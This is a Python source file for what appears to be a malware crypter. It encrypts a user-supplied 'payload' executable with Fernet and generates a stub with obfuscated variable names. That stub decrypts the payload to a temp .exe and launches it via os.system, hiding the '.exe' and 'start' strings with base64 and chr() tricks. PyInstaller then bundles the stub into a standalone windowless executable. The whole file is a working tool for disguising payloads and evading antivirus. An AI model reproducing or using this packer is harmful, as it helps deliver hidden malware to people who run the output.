import base64
import os
import shutil
import subprocess
import sys
import tempfile
from cryptography.fernet import Fernet


def encrypt_software(input_file):
    key = Fernet.generate_key()
    cipher = Fernet(key)
    with open(input_file, "rb") as f:
        encrypted_data = cipher.encrypt(f.read())

    return key, encrypted_data


def create_decryptor_code(key, encrypted_data):
    decryptor_code = f"""
import os as ezpMFrR15e
import base64 as Qi8WY0cx25
import tempfile as sKu1Of17R0
from cryptography.fernet import Fernet as rwkbRuKEyW

pkNnqUNSfJ = {key!r}
dwqv6TX0Po = rwkbRuKEyW(pkNnqUNSfJ)

Wb6LBgN7YE = {encrypted_data}

# Decrypt the content
qow48Na9u2 = dwqv6TX0Po.decrypt(Wb6LBgN7YE)

# Create a temporary file and write the decrypted content to it
with sKu1Of17R0.NamedTemporaryFile(suffix=chr(46)+Qi8WY0cx25.b64decode(b'ZXhl').decode(), delete=False) as ThZBJ1vU2V:
    ThZBJ1vU2V.write(qow48Na9u2)

# Close the file to allow execution
ThZBJ1vU2V.close()

# Execute the decrypted file
HShPfDEUlw = f"{chr(115)+chr(116)+chr(97)+chr(114)+chr(116)} {{ThZBJ1vU2V.name}}"
ezpMFrR15e.system(HShPfDEUlw)
"""

    return decryptor_code


def write_decryptor_script(decryptor_code, output_path, output_filename):
    decryptor_script_path = f"{output_path}\GEN_{output_filename}.pyw"
    with open(decryptor_script_path, "w") as f:
        f.write(decryptor_code)

    return decryptor_script_path


def compile_decryptor_script(decryptor_script_path, input_filename, output_path, output_filename):
    subprocess.call(["pyinstaller", "--onefile", decryptor_script_path])

    os.remove(f'GEN_{input_filename}.spec')
    shutil.rmtree('build')
    shutil.move(f'{output_path}\dist\GEN_{input_filename}.exe',
                f'{output_path}\GEN_{output_filename}.exe')
    shutil.rmtree('dist')
    os.remove(decryptor_script_path)


def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <path_to_payload>")
        sys.exit(1)

    print("Hello World")
    input_file = sys.argv[1]
    input_filename_w_extention = os.path.basename(input_file)
    input_filename = input_filename_w_extention[:-4]
    output_filename = input_filename
    output_path = os.getcwd()

    key, encrypted_data = encrypt_software(input_file)
    decryptor_code = create_decryptor_code(key, encrypted_data)
    decryptor_script_path = write_decryptor_script(
        decryptor_code, output_path, output_filename)
    compile_decryptor_script(decryptor_script_path,
                             input_filename, output_path, output_filename)


if __name__ == "__main__":
    main()
